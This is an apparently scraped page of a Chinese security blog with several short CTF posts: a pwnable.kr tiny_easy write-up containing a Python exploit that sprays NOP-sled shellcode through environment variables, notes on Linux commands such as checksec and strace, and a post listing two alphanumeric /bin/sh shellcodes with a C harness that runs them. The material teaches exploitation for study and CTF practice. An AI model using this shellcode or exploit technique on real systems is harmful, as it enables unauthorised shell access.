<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">         <span class="keyword">long</span> <span class="keyword">int</span> amma = syscall(<span class="number">354</span>);</div><div class="line">         <span class="built_in">printf</span>(<span class="string">"System call sys_hello returned %ld\n"</span>, amma);</div><div class="line">         <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果内核编译正确的话，程序返回的是&quot;<em>System call sys_hello returned 0</em>&quot;</p>
<p>通过dmesg命令可以查看内核信息，发现&quot;Hello world&quot;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/01/程序执行中我们所忽略的事/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/01/程序执行中我们所忽略的事/" itemprop="url">程序执行中我们所忽略的事</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-01T00:13:10+08:00">
                2017-10-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？"><a href="#1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？" class="headerlink" title="1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？"></a>1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？</h4><p>这个问题可能让绝大多数人困惑，因为我们所看到的基本上都符合这个结论。那什么情况下不符合呢？</p>
<p>这就不得不提到我做过的pwnable.kr上的tiny_easy一题了</p>
<blockquote>
<p>I made a pretty difficult pwn task.<br>However I also made a dumb rookie mistake and made it too easy :(<br>This is based on real event :) enjoy.</p>
<p>ssh <a href="mailto:tiny_easy@pwnable.kr" target="_blank" rel="external">tiny_easy@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>程序主体就一下几行:</p>
<blockquote>
<p>pop     eax<br>pop     edx<br>mov     edx, [edx]<br>call    edx</p>
</blockquote>
<p>那么eax其实是参数个数，而edx则是argv[0]所在字符串的前4位组成的32位地址</p>
<p><strong>exp.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">jumpto = <span class="string">"\xb0\xaf\xb5\xff"</span></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></div><div class="line">nopsled = <span class="string">"\x90"</span>*<span class="number">4096</span>;</div><div class="line">payload = nopsled+shellcode</div><div class="line"></div><div class="line">myenv = &#123;&#125;</div><div class="line"><span class="comment"># Arbitrary largeish number</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">    myenv[<span class="string">"spray"</span>+str(i)] = payload</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    p = subprocess.Popen([jumpto], executable=<span class="string">"tiny_easy"</span>, env=myenv)</div><div class="line">    p.wait()</div></pre></td></tr></table></figure>
<p>脚本很简单，利用的是类堆喷的方法。</p>
<p>这里subprocess.Popen(args, executable=None, env=None)</p>
<p>其实args这个list中的第一个参数是argv[0]，而执行的程序则是executable对应的elf文件。可以发现<font color="#f00">用户可以控制程序执行时argv[0]</font></p>
<p>当然除了subprocess有这个功能，pwntools中pwnlib.tubes.process.process(<em>args</em>, <em>shell = False</em>, <em>executable = None</em>, <em>env = None</em>, <em>timeout = &#39;default&#39;</em>, <em>log_level = INFO</em>)也可以有类似的操作</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/shell命令解析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/30/shell命令解析/" itemprop="url">shell命令解析</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-30T16:14:22+08:00">
                2017-09-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>此标题范围广，内容多，不易梳理清楚。本人也因为能力有限，不可能面面俱到，只能讲讲在ctf中可能会遇到的一些命令。</p>
<h3 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1. checksec"></a>1. checksec</h3><p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ checksec tiny_easy</div><div class="line">[*] &apos;/tmp/tiny_easy&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<h3 id="2-ldd"><a href="#2-ldd" class="headerlink" title="2. ldd"></a>2. ldd</h3><p>用来查看程序运行所需的共享库,常用来解决程序因缺少某个库文件而不能运行的一些问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ldd ascii_easy</div><div class="line">	linux-gate.so.1 =&gt;  (0xf7765000)</div><div class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7591000)</div><div class="line">	/lib/ld-linux.so.2 (0x56565000)</div></pre></td></tr></table></figure>
<h3 id="3-export"><a href="#3-export" class="headerlink" title="3. export"></a>3. export</h3><p>设置全局变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ export PATH=/tmp/test:$PATH</div><div class="line">$ echo $PATH      # 输出某个全局变量，没有的话就输出一行空串</div><div class="line">$ env     # 查看所有全局变量</div><div class="line">$ set     # 显示所有本地定义的Shell变量</div><div class="line">$ unset PATH     # 清除环境变量</div></pre></td></tr></table></figure>
<p>export是设置的临时全局变量，在关闭shell之后就自动清除了；</p>
<p>而如果修改文件/etc/bashrc和/etc/profile，那这个改变就会是永久的。</p>
<h3 id="4-ldconfig"><a href="#4-ldconfig" class="headerlink" title="4. ldconfig"></a>4. ldconfig</h3><p>ldconfig是一个动态链接库管理命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ export LD_LIBRARY_PATH=/tmp/test</div><div class="line">$ ldconfig</div><div class="line">$ ldd ascii_easy</div></pre></td></tr></table></figure>
<p>最后没有正确链接上，可能的原因是因为本机与那个动态链接库不兼容导致！</p>
<h3 id="5-strace"><a href="#5-strace" class="headerlink" title="5. strace"></a>5. strace</h3><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">-c 统计每一系统调用的所执行的时间,次数和出错的次数等. </div><div class="line">-d 输出strace关于标准错误的调试信息. </div><div class="line">-f 跟踪由fork调用所产生的子进程. </div><div class="line">-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. </div><div class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. </div><div class="line">-h 输出简要的帮助信息. </div><div class="line">-i 输出系统调用的入口指针. </div><div class="line">-q 禁止输出关于脱离的消息. </div><div class="line">-r 打印出相对时间关于,,每一个系统调用. </div><div class="line">-t 在输出中的每一行前加上时间信息. </div><div class="line">-tt 在输出中的每一行前加上时间信息,微秒级. </div><div class="line">-ttt 微秒级输出,以秒了表示时间. </div><div class="line">-T 显示每一调用所耗的时间. </div><div class="line">-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. </div><div class="line">-V 输出strace的版本信息. </div><div class="line">-x 以十六进制形式输出非标准字符串 </div><div class="line">-xx 所有字符串以十六进制形式输出. </div><div class="line">-a column  设置返回值的输出位置.默认 为40. </div><div class="line">-e expr 指定一个表达式,用来控制如何跟踪.格式如下: </div><div class="line">[qualifier=][!]value1[,value2]...  qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如: </div><div class="line">-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\. </div><div class="line">-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all. </div><div class="line">-e trace=file 只跟踪有关文件操作的系统调用. </div><div class="line">-e trace=process 只跟踪有关进程控制的系统调用. </div><div class="line">-e trace=network 跟踪与网络有关的所有系统调用. </div><div class="line">-e strace=signal 跟踪所有与系统信号有关的 系统调用 </div><div class="line">-e trace=ipc 跟踪所有与进程通讯有关的系统调用 </div><div class="line">-e abbrev=set 设定 strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all. </div><div class="line">-e raw=set 将指 定的系统调用的参数以十六进制显示. </div><div class="line">-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号. </div><div class="line">-e read=set 输出从指定文件中读出 的数据.例如: </div><div class="line">-e read=3,5 -e write=set 输出写入到指定文件中的数据. </div><div class="line">-o filename 将strace的输出写入文件filename </div><div class="line">-p pid 跟踪指定的进程pid. </div><div class="line">-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出. </div><div class="line">-u username 以username 的UID和GID执行被跟踪的命令</div></pre></td></tr></table></figure>
<p>strace -if elfname   一般而言会返回   execve(elf绝对路径， elf绝对路径，其他)</p>
<p>但是，如果elf所在目录被加入PATH全局变量，返回的就是  execve(elf绝对路径， elfname，其他)</p>
<p>也就是说，后一种直接用文件名就可执行！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/30/全是可见字符的shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/30/全是可见字符的shellcode/" itemprop="url">全是可见字符的shellcode</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-30T12:19:10+08:00">
                2017-09-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近做了pwnable.kr上的一道题，收获颇丰！其中就有对全是可见字符组成的shellcode的总结，也就是本文。</p>
<h3 id="全是可见字符的shellcode"><a href="#全是可见字符的shellcode" class="headerlink" title="全是可见字符的shellcode"></a>全是可见字符的shellcode</h3><blockquote>
<p>shellcode1: PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx</p>
<p>shellcode2: PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA</p>
</blockquote>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>首先写一个test.c文件:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">//    char shellcode[] = "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx";</span></div><div class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA"</span>;</div><div class="line">    (*(<span class="keyword">void</span> (*)())shellcode)();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关闭NX保护:</p>
<blockquote>
<p>gcc -z execstack -o test test.c</p>
</blockquote>
<p>运行之后获得shell</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://inaz2.hatenablog.com/entry/2014/07/11/004655" target="_blank" rel="external">http://inaz2.hatenablog.com/entry/2014/07/11/004655</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">129</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">54</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
